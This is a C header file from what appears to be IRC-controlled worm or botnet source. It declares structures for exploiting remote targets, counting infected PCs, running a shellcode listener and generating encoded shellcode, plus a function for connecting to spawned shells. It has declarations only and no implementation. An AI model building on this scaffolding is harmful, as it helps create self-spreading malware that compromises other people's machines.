#ifndef __SHELLCODE_H__
#define __SHELLCODE_H__

/**************
** Structure **
**************/
struct ShellcodeHandler_s
{
	unsigned short	usPort;					// Port to run the shellcode listener on
	bool			bSilent;				// Output irc messages
	DWORD			nRequest;				// Request the client is asking for
};

struct ExploitInfo_s 
{
	unsigned short	usRemotePort;			// Port we infect the target on
	DWORD			dwExploitId;			// Pointer to the exploit id
	DWORD			dwRemoteIp;				// Target IP in network format
};

/************
** Typedef **
************/
typedef void(*hExploitGate)(ExploitInfo_s* pExploitInfo);

/**************
** Structure **
**************/
struct Exploit_s 
{
	char			szCommand[20];			// Command to call the exploit
	char*			szName;					// Name for the given exploit
	unsigned short	usPort;					// Port to exploit on
	hExploitGate	hExploit;				// Callgate to ExploitInfo struct
	unsigned int	iStatics;				// How many pc's we exploited already
	DWORD			dwExploitId;			// Number of this exploit 
	bool			bEnabled;				// Is this scanner in use?
};

/*************
** Function **
*************/
bool	GetSocketAddress(SOCKET sSock, char* szOutput);
bool	Bind(SOCKET sSock, const int iPort, bool bUDP);
void	ShellcodeServer(ShellcodeHandler_s* pShellcodeHandler);
DWORD	GenerateEncodedShellcode(char *szBuffer, DWORD dwBuffersize, DWORD dwIpAddress, unsigned short iPort, DWORD nRequest, char *BadCharacters, DWORD nBadCharacters);
DWORD	GenerateShellcode(char *szBuffer, DWORD dwBuffersize, DWORD dwIpAddress, unsigned short iPort, DWORD nRequest);
int		Unicodify(const char *szIn, const unsigned long lInLen, char *szOut, const unsigned long lOutLen);
bool	ConnectShell(char* szIpAddress, int iPort, DWORD dwExploitId, int nSeccondsToWait);

#endif //__SHELLCODE_H__